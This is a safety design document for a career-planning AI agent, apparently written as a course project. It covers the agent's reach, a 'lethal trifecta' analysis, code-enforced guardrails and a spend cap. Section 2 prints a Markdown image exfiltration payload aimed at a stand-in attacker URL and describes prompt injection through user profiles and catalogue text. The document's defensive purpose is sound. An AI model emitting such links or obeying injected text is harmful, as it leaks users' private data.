# Safety: what the agent can reach, and what holds it

Week 8's test for a guardrail is that it works **without the model behaving**. Everything below is enforced in code, before or around the AI calls. None of it relies on a sentence in a prompt.

## 1. What the agent can touch

| It can | It cannot |
|---|---|
| Read the Skills Framework and course catalogue (`data/careers.db`, read-only lookups) | Write to any database, file or record |
| Search the local course index | Enrol, pay, apply or contact anyone (no tool for any of these exists) |
| Call the Claude API (the only network call while it runs) | Send data anywhere else: no email, web or webhook tool |
| Show the plan on screen and offer it as a JSON download | Act without the user: role, path and plan all need a human answer (`interrupt()`) |

**Blast radius:** the worst it can do is give a bad plan, which the user can then reject. It can't spend the user's money, change their records, or reach other users.

## 2. Lethal trifecta: 2 of 3 legs, and the third one is closed in code

| Leg | Here? | Where |
|---|---|---|
| Private data | **Yes** | age, residency, credit balance, job and goal in the profile |
| Untrusted content | **Yes** | the user's free-text goal (read by `read_profile`), and course titles/providers from the third-party catalogue (read by `pick_courses`) |
| A way to send data out | **Closed (Fix 3)** | no outbound tool exists. One path remained: the app displayed AI-written text as Markdown, and in one place as raw HTML. A reply containing `![](https://attacker/?d=…)` made the browser fetch that URL with no click. In a browser test, unescaped text made 3 requests to the attacker URL. Through `ui_art.plain()`: 0 requests and 0 links. |

Data does go to Anthropic, because that's what calling the model means. That's a choice we made on purpose.

## 3. Guardrails, all in code

| Risk (OWASP LLM / week 8) | Guardrail | File |
|---|---|---|
| Prompt injection in the profile | profile wrapped in `<profile>` and labelled as data. The sub-agents' prompts never see the profile text. | `llm_steps.py` |
| Model picks something that doesn't exist | the AI chooses only from lists built by code. Role ids and course refs off the list are dropped or replaced by the rule pick. | `graph.py`, `course_agent.py` |
| Wrong money figures | every fee, subsidy and credit is computed in `funding.py`, never by the AI | `funding.py` |
| A broken plan reaches the user | `check_plan()` postconditions. A failing plan is never shown (fails loudly). | `plan_rules.py` |
| Claiming actions it never took | the final message is a code template, not AI text | `graph.py: finish` |
| Excessive agency | three human checkpoints. "Not for me" saves nothing. | `graph.py` |
| **Unbounded consumption** | **spend cap per plan (Fix 3):** before each AI call, code checks that the call's worst case (all 4,000 output tokens) still fits under `CAREER_MAX_RUN_USD`, default $0.50. If it doesn't fit, the call is **never sent**: that step uses its rules version, the plan still passes `check_plan`, and the user is told. Retries only happen on temporary errors (429/5xx, Fix 1). | `llm_steps.py`, `graph.py` |
| Output used as Markdown/HTML | AI- and catalogue-written text is escaped before display (`plain()`) | `ui_art.py`, `app.py` |

**Why a $0.50 cap, and why fall back instead of stopping:** past runs cost about $0.015 to reach the path choice (max $0.032). A full plan with ~50 skill gaps is estimated at about $0.15, so $0.50 leaves room for normal use while stopping a loop well before it costs real money. When the cap is reached, the plan finishes on the rules baseline (baseline 2) instead of stopping. That baseline passed every plan check (E6: 63/63 in the 18 Oct run), so the user still gets a correct plan, just a less tailored one. `test_zero_budget_plan_uses_rules_and_says_so` checks this with a $0 cap, where the API is never called.

## 4. What is not covered (honest limits)

- **Rate limit:** none. The app is a single-user local tool, and a public deployment would need one.
- **Standalone sub-agent runs** (the E3a/E3b evals call them directly) have no cap. Only a full plan holds a budget.
- **Approval is one click.** The plan screen shows every skill, course and fee before approval, but we didn't measure whether users actually read it (approval fatigue).
- **Attack suite:** injection through course text and false positives on harmless goals (e.g. "apply my Excel skills… pay rise" is flagged by the rules baseline) are added as eval cases in Fix 4, each run several times.
